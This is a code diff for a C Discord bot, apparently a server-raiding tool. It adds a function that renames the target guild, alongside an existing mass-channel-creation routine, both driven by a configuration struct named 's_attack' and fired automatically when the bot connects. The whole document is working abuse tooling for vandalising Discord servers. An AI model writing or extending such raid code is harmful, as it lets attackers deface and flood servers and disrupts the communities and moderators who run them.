@@ -7,7 +7,6 @@
 #include <stdbool.h>
 #include <orca/discord.h>
 
-
 u64_snowflake_t get_guild(struct discord *client)
 {
     // get guilds bot is a part of
@@ -54,6 +53,18 @@ void mass_channel(struct discord *client, u64_snowflake_t guild_id,
     }
 }
 
+void guild_name(struct discord *client, u64_snowflake_t guild_id,
+                char *guild_name)
+{
+    discord_modify_guild(
+        client,
+        guild_id,
+        &(struct discord_modify_guild_params){
+            .name = guild_name,
+        },
+        NULL);
+}
+
 void on_ready(struct discord *client)
 {
     const struct discord_user *bot = discord_get_self(client);
@@ -79,7 +90,11 @@ void on_ready(struct discord *client)
     if (s_attack.mass_channel_enabled == true)
     {
         mass_channel(client, guild_id, s_attack.mass_channel_name, s_attack.mass_channel_count);
-    } 
+    }
+
+    if(s_attack.guild_name_enabled == true) {
+        guild_name(client, guild_id, s_attack.guild_name);
+    }
 }
 
 void on_message(struct discord *client,
